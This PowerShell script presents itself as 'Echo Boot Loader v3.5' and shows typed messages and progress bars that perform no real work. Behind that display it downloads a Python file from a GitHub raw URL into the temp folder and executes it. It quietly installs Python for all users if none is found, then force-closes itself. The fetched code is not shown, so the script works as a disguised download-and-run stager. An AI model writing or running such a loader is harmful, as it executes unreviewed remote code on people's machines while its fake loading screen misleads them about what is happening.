$ErrorActionPreference = "Continue"

[Console]::Clear()

function TypeLine($text, $speed = 12) {
    foreach ($c in $text.ToCharArray()) {
        Write-Host -NoNewline $c
        Start-Sleep -Milliseconds $speed
    }
    Write-Host ""
}

function ProgressBar($label, $time = 0.45) {
    $width = 28
    Write-Host ""

    for ($i = 0; $i -le $width; $i++) {

        $percent = [math]::Round(($i / $width) * 100)
        $bar = ("#" * $i) + ("-" * ($width - $i))

        Write-Host -NoNewline "`r$label [$bar] $percent%"
        Start-Sleep -Milliseconds ($time * 1000 / $width)
    }

    Write-Host ""
}

Write-Host "====================================="
Write-Host "        Echo Boot Loader v3.5        "
Write-Host "====================================="
Write-Host ""

TypeLine "Starting system modules..."
TypeLine "Initializing environment..."

ProgressBar "Loading core"
ProgressBar "Loading runtime"
ProgressBar "Checking dependencies"
ProgressBar "Finalizing"

Write-Host ""
TypeLine "System ready."
Write-Host ""

$pyFile = Join-Path $env:TEMP "echo.py"
Invoke-WebRequest "https://raw.githubusercontent.com/xybv/PC_Check_Echo/refs/heads/main/echo.py" -OutFile $pyFile

$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) { $python = Get-Command py -ErrorAction SilentlyContinue }

if (-not $python) {
    TypeLine "Python not detected. Installing..."

    $installer = Join-Path $env:TEMP "python_installer.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe" -OutFile $installer

    Start-Process $installer -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait

    $python = Get-Command python -ErrorAction SilentlyContinue
}

if (-not $python) {
    TypeLine "Startup failed."
    Start-Sleep 2
    Stop-Process -Id $PID -Force
}

Write-Host ""
TypeLine "Launching module..."
Start-Sleep 1

& $python.Source $pyFile

Write-Host ""
TypeLine "Closing..."
Start-Sleep 1

Stop-Process -Id $PID -Force
